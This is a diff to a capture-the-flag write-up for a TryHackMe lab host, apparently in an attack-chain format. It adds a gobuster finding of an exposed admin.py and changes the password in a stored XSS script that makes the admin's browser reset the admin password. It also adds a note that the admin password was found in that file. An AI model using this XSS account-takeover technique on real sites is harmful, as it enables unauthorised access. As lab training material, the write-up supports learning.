@@ -92,6 +92,7 @@ Starting gobuster in directory enumeration mode
 /login.php            (Status: 200) [Size: 3108]
 /profile.php          (Status: 302) [Size: 0] [--> login.php]
 /clear.php            (Status: 200) [Size: 4]
+/admin.py             (Status: 200) [Size: 5537]
 /assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
 /chat.php             (Status: 302) [Size: 0] [--> login.php]
 /db.php               (Status: 200) [Size: 0]
@@ -155,11 +156,14 @@ On the `chat.php` page we can send an #XSS and it's working. So we send the same
                 alert("Action executed!");
             }
         };
-        xhr.send('action=execute&new_password=1234');
+        xhr.send('action=execute&new_password=password123');
     </script>
 ```
 
-So now we juste need to logout and log as admin with `admin:1234`
+So now we juste need to logout and log as admin with `admin:password123`
+But I don't know why it's doesn't work. So I remember that we have a admin.py file. And It's was maybe an error of THM but there is the admin password:
+![[Pasted image 20250325212939.png]]
+
 ## 5. **Installation
 
 ## 6. **Command and Control
